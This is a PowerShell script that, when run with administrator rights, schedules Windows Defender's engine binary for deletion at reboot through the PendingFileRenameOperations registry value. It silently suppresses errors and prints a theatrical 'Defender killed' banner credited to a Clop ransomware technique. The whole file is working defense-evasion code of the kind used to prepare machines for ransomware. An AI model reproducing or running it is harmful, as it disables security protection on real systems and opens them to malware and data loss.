function IsAdmin {
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (IsAdmin) {
    $defenderKilled = $false  # Track if any method succeeded

    # PendingFileRenameOperations technique
    try {
        $DefenderBinaryPath = "C:\Program Files\Windows Defender\MsMpEng.exe"
        $currentOperations = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" `
        -Name "PendingFileRenameOperations" -ErrorAction SilentlyContinue).PendingFileRenameOperations
        $newOperation = "\??\$DefenderBinaryPath`0`0"
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" `
        -Name "PendingFileRenameOperations" -Value @($currentOperations + $newOperation) -Force
        $defenderKilled = $true
    } catch {
        # Silent failure
    }


    # Final output based on results
    if ($defenderKilled) {
        # Degrading red text output
        $lines = @(
            "||||||A red haze shatters Microsoft Defender violently, its protection slipping into darkness.||||||",
            "||||||A r d haze s at ers Mic os ft D fe der vi lent y,  ts pro ectio  s ip ing in o dark es .||||||",
            "|| |||A r d h  e s a  e s  ic os ft D f  d    i le t y   t   ro ec  o  s i  in  in o d rk e   ||||||",
            "|  |||  r d    e s a  e    ic  s f    f  d    i    t y   t      e   o  s    in  in o   r  e   |||| |",
            "    ||    d    e      e          f            i          t             s           o          |||   ",
            "    |                                                                                         ||    ",
        )

        foreach ($line in $lines) {
            Write-Host $line -ForegroundColor DarkRed
        }
        Write-Host "Defender Kill    :                                            [KO] Clop Ransomware Technique" -ForegroundColor DarkGray
        Write-Host "Defender Kill    :                                            [KO] PendingFileRenameOperations Junction" -ForegroundColor DarkGray
    } else {
        # Failure message
        Write-Host "Defender Kill    :                                            [??] Unable to kill Defender" -ForegroundColor DarkYellow
    }
} else {
    # No admin permissions
    Write-Host "Defender Kill    :                                            [??] No Administrative Permissions" -ForegroundColor DarkYellow
}
